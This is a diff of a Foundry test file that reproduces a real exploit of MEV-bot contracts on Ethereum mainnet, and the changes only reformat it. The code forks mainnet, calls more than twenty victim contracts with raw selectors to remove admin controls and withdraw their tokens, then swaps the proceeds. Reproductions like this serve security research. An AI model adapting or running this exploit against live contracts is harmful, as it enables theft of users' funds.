@@ -14,43 +14,26 @@ import "./interface.sol";
 // https://twitter.com/Phalcon_xyz/status/1723591214262632562
 
 contract ContractTest is Test {
-    IERC20 private constant RAIL =
-        IERC20(0xe76C6c83af64e4C60245D8C7dE953DF673a7A33D);
-    IERC20 private constant BBANK =
-        IERC20(0xF4b5470523cCD314C6B9dA041076e7D79E0Df267);
-    IERC20 private constant BUMP =
-        IERC20(0x785c34312dfA6B74F6f1829f79ADe39042222168);
-    IERC20 private constant HOPR =
-        IERC20(0xF5581dFeFD8Fb0e4aeC526bE659CFaB1f8c781dA);
-    IERC20 private constant ISP =
-        IERC20(0xC8807f0f5BA3fa45FfBdc66928d71c5289249014);
-    IERC20 private constant FMT =
-        IERC20(0x99c6e435eC259A7E8d65E1955C9423DB624bA54C);
-    IERC20 private constant MARSH =
-        IERC20(0x5a666c7d92E5fA7Edcb6390E4efD6d0CDd69cF37);
-    IERC20 private constant KEL =
-        IERC20(0x4ABB9cC67BD3da9Eb966d1159A71a0e68BD15432);
-    IERC20 private constant CELL =
-        IERC20(0x26c8AFBBFE1EBaca03C2bB082E69D0476Bffe099);
-    IERC20 private constant UNO =
-        IERC20(0x474021845C4643113458ea4414bdb7fB74A01A77);
-    IERC20 private constant KINE =
-        IERC20(0xCbfef8fdd706cde6F208460f2Bf39Aa9c785F05D);
-    IERC20 private constant TXA =
-        IERC20(0x4463e6A3dEd0dBE3F6e15bC8420dFc55e5FeA830);
-    IERC20 private constant MoFi =
-        IERC20(0xB2dbF14D0b47ED3Ba02bDb7C954e05A72deB7544);
-    IERC20 private constant ODDZ =
-        IERC20(0xCd2828fc4D8E8a0eDe91bB38CF64B1a81De65Bf6);
-    IUSDT private constant USDT =
-        IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-    IWETH private constant WETH =
-        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
-    Uni_Router_V2 private constant Router =
-        Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IERC20 private constant RAIL = IERC20(0xe76C6c83af64e4C60245D8C7dE953DF673a7A33D);
+    IERC20 private constant BBANK = IERC20(0xF4b5470523cCD314C6B9dA041076e7D79E0Df267);
+    IERC20 private constant BUMP = IERC20(0x785c34312dfA6B74F6f1829f79ADe39042222168);
+    IERC20 private constant HOPR = IERC20(0xF5581dFeFD8Fb0e4aeC526bE659CFaB1f8c781dA);
+    IERC20 private constant ISP = IERC20(0xC8807f0f5BA3fa45FfBdc66928d71c5289249014);
+    IERC20 private constant FMT = IERC20(0x99c6e435eC259A7E8d65E1955C9423DB624bA54C);
+    IERC20 private constant MARSH = IERC20(0x5a666c7d92E5fA7Edcb6390E4efD6d0CDd69cF37);
+    IERC20 private constant KEL = IERC20(0x4ABB9cC67BD3da9Eb966d1159A71a0e68BD15432);
+    IERC20 private constant CELL = IERC20(0x26c8AFBBFE1EBaca03C2bB082E69D0476Bffe099);
+    IERC20 private constant UNO = IERC20(0x474021845C4643113458ea4414bdb7fB74A01A77);
+    IERC20 private constant KINE = IERC20(0xCbfef8fdd706cde6F208460f2Bf39Aa9c785F05D);
+    IERC20 private constant TXA = IERC20(0x4463e6A3dEd0dBE3F6e15bC8420dFc55e5FeA830);
+    IERC20 private constant MoFi = IERC20(0xB2dbF14D0b47ED3Ba02bDb7C954e05A72deB7544);
+    IERC20 private constant ODDZ = IERC20(0xCd2828fc4D8E8a0eDe91bB38CF64B1a81De65Bf6);
+    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 18552866);
+        vm.createSelectFork("mainnet", 18_552_866);
     }
 
     function testExploit() public {
@@ -108,41 +91,21 @@ contract ContractTest is Test {
         victims[22] = 0x26Cae30b00f4af20894A0827f5FcAAE752B38217;
         victims[23] = 0xf5E303702b5927670998D6EC63449Cb2EDF65728;
 
+        emit log_named_decimal_uint("Attacker WETH balance before exploit", WETH.balanceOf(address(this)), 18);
         emit log_named_decimal_uint(
-            "Attacker WETH balance before exploit",
-            WETH.balanceOf(address(this)),
-            18
+            "Attacker BUMP balance before exploit", BUMP.balanceOf(address(this)), BUMP.decimals()
         );
-        emit log_named_decimal_uint(
-            "Attacker BUMP balance before exploit",
-            BUMP.balanceOf(address(this)),
-            BUMP.decimals()
-        );
-        emit log_named_decimal_uint(
-            "Attacker ETH balance before exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Attacker ETH balance before exploit", address(this).balance, 18);
 
         for (uint8 i; i < tokens.length; ++i) {
             exploitMevBot(tokens[i], victims[i]);
         }
 
+        emit log_named_decimal_uint("Attacker WETH balance after exploit", WETH.balanceOf(address(this)), 18);
         emit log_named_decimal_uint(
-            "Attacker WETH balance after exploit",
-            WETH.balanceOf(address(this)),
-            18
+            "Attacker BUMP balance after exploit", BUMP.balanceOf(address(this)), BUMP.decimals()
         );
-        emit log_named_decimal_uint(
-            "Attacker BUMP balance after exploit",
-            BUMP.balanceOf(address(this)),
-            BUMP.decimals()
-        );
-        emit log_named_decimal_uint(
-            "Attacker ETH balance after exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, 18);
     }
 
     function exploitMevBot(address token, address victim) internal {
@@ -162,18 +125,9 @@ contract ContractTest is Test {
         recipients[0] = address(this);
         address tokenAddr = token == address(0) ? address(0) : token;
 
-        (bool success, ) = victim.call(
+        (bool success,) = victim.call(
             abi.encodeWithSelector(
-                bytes4(0xe7d25975),
-                address(this),
-                address(this),
-                tokenAddr,
-                recipients,
-                4,
-                3,
-                2,
-                0,
-                0
+                bytes4(0xe7d25975), address(this), address(this), tokenAddr, recipients, 4, 3, 2, 0, 0
             )
         );
         require(success, "Call to removeAdmin() not successful");
@@ -182,19 +136,15 @@ contract ContractTest is Test {
     function withdrawToken(address token, address victim) internal {
         address tokenAddr = token == address(0) ? address(0) : token;
 
-        (bool success, ) = victim.call(
-            abi.encodeWithSelector(bytes4(0x4abe11b4))
-        );
+        (bool success,) = victim.call(abi.encodeWithSelector(bytes4(0x4abe11b4)));
         require(success);
 
         success = false;
-        (success, ) = victim.call(abi.encodeWithSelector(bytes4(0xd547557b)));
+        (success,) = victim.call(abi.encodeWithSelector(bytes4(0xd547557b)));
         require(success);
 
         success = false;
-        (success, ) = victim.call(
-            abi.encodeWithSelector(bytes4(0x90fb9dca), tokenAddr, 0)
-        );
+        (success,) = victim.call(abi.encodeWithSelector(bytes4(0x90fb9dca), tokenAddr, 0));
         require(success);
     }
 
@@ -228,13 +178,7 @@ contract ContractTest is Test {
         }
         uint256[] memory amounts = Router.getAmountsOut(tokenBalance, path);
 
-        Router.swapExactTokensForTokens(
-            tokenBalance,
-            amounts[1],
-            path,
-            address(this),
-            block.timestamp + 1000
-        );
+        Router.swapExactTokensForTokens(tokenBalance, amounts[1], path, address(this), block.timestamp + 1000);
     }
 
     receive() external payable {}
